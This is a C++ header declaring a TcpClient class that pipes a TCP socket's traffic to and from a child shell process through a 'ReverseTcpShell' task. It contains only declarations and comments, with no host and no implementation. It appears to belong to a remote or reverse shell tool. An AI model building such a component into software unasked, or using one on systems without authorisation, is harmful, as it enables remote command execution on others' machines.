#ifndef TCP_CLIENT_H
#define TCP_CLIENT_H

#include <Common.h>

#include <thread>
#include <memory>

//! Forward declare.
namespace Task { class ReverseTcpShell; }

/*
 *  @brief  The tcp client manager object.
 *          Responsible for managing the server-client connection and
 *          communication.
 */
class TcpClient : public std::enable_shared_from_this<TcpClient>
{
public:
    typedef std::shared_ptr<TcpClient> Pointer;     ///< The TcpClient shared pointer type def.

    //! Destructor.
    ~TcpClient();

    /*
     *  @brief  Start the tcp connection.
     */
    void Start();

    /*
     *  @brief  Get the underlying asio tcp socket.
     *
     *  @return reference to the underlying asio tcp socket.
     */
    asio::ip::tcp::socket &GetSocket();

    /*
     *  @brief  Create a TcpClient object on the heap.
     *
     *  @param  ioContext the asio io execution context.
     * 
     *  @return shared pointer to allocated TcpClient object.
     */
    static Pointer Create(asio::io_context &ioContext);

private:
    typedef std::array<char, 8192>  Buffer;                             ///< The 8KB contiguous buffer type definition.
    typedef std::unique_ptr<Task::ReverseTcpShell> ReverseTcpShellPtr;  ///< The reverse tcp shell task object pointer.

    static const asio::chrono::milliseconds WATCH_TIMER_DURATION;       ///< Child process watch timer duration.

    /*
     *  @brief  Constructor.
     *
     *  @param  ioContext the asio io execution context.
     */
    TcpClient(asio::io_context &ioContext);

    /*
     *  @brief  Cancel all IO operations made for this TcpClient.
     *          Results in a disconnection.
     */
    void Cancel();
    
    /*
     *  @brief  Schedule an asynchronous write to the client.
     *
     *  @param  message the message to send.
     */
    void WriteToSocket(const std::string &message);

    /*
     *  @brief  Schedule an asynchronous read from the client.
     */
    void ReadFromSocket();

    /*
     *  @brief  Completion handler for the asynchronous write to the client.
     *          Called when the message is sent to the client.
     *
     *  @param  error the error code.
     *  @param  nBytesTransferred the number of bytes sent to the client.
     */
    void OnWriteToSocket(const asio::error_code &error, const size_t nBytesTransferred);

    /*
     *  @brief  Completion handler for the asynchronous read from the client.
     *          Called when the message is read from the client.
     *
     *  @param  error the error code.
     *  @param  nBytesTransferred the number of bytes sent to the client.
     */
    void OnReadFromSocket(const asio::error_code &error, const size_t nBytesTransferred);

    /*
     *  @brief  Schedule an asynchronous write to the child shell process.
     *
     *  @param  message the message to send.
     */
    void WriteToShell(const std::string &message);

    /*
     *  @brief  Schedule an asynchronous read from the child shell process.
     */
    void ReadFromShell();

    /*
     *  @brief  Completion handler for the asynchronous write to the child shell process.
     *          Called when the message is sent to the child shell process.
     *
     *  @param  error the error code.
     *  @param  nBytesTransferred the number of bytes sent to the child shell process.
     */
    void OnWriteToShell(const asio::error_code &error, const size_t nBytesTransferred);

    /*
     *  @brief  Completion handler for the asynchronous read from the child shell process.
     *          Called when the message is read from the child shell process.
     *
     *  @param  error the error code.
     *  @param  nBytesTransferred the number of bytes sent to the child shell process.
     */
    void OnReadFromShell(const asio::error_code &error, const size_t nBytesTransferred);

    /*
     *  @brief  The child shell process status timer callback.
     *          Called every 100ms to check whether the child shell process has exited,
     *          closes the connection if the child has exited.
     *
     *  @param  error the error code.
     */
    void CheckShellAlive(const asio::error_code &error);

    asio::io_context        &m_ioContext;               ///< Reference to the asio io context.
    asio::ip::tcp::socket   m_socket;                   ///< The asio tcp socket wrapper.
    asio::steady_timer      m_childWatchTimer;          ///< The child shell process watch timer.
    asio::streambuf         m_socketInputBuffer;        ///< Buffer to store data from the client.
    Buffer                  m_shellInputBuffer;         ///< Buffer to store data from the shell child process.

    ReverseTcpShellPtr      m_pReverseTcpShellTask;     ///< The reverse tcp shell task object.
};

inline asio::ip::tcp::socket &TcpClient::GetSocket()
{
    return m_socket;
}

#endif // TCP_CLIENT_H
